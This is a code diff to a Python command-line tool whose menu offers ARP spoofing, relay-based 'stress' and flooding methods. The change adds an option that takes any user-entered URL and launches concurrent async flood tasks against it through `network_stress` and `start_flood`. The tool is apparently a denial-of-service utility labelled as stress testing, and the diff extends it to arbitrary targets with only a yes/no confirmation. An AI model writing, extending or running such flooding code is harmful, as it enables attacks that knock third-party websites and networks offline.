@@ -43,11 +43,12 @@ async def start_flood(url, ip=None):
             tasks.append(task)
         await asyncio.gather(*tasks)
 
-def network_stress(ip=None):
+def network_stress(ip=None, custom_urls=None):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     tasks = []
-    for url in default_urls:  # Correctly define the urls variable
+    urls = custom_urls if custom_urls else default_urls
+    for url in urls:
         tasks.append(loop.create_task(start_flood(url, ip)))
     loop.run_until_complete(asyncio.wait(tasks))
 
@@ -94,10 +95,11 @@ def display_ui():
         [5] ARP Spoofing
         [6] Connect and Stress via Relay IP
         [7] Scrape Chinese Textbooks
-        [8] Exit
+        [8] Stress Test a Custom URL
+        [9] Exit
         """)
 
-        choice = input("Select the method (1-8): ").strip()
+        choice = input("Select the method (1-9): ").strip()
         ip_address = None
 
         if choice == "1":
@@ -152,6 +154,14 @@ def display_ui():
             books = scrape_chinese_textbooks(query)
             display_books(books)
         elif choice == "8":
+            custom_url = input("Enter the URL to stress test: ").strip()
+            proceed = input("Proceed with stress test on the custom URL? (1 for Yes, 2 for No): ").strip()
+            if proceed == "1":
+                print("Starting stress test on the custom URL...")
+                network_stress(custom_urls=[custom_url])
+            else:
+                continue
+        elif choice == "9":
             print("Exiting...")
             break
         else:
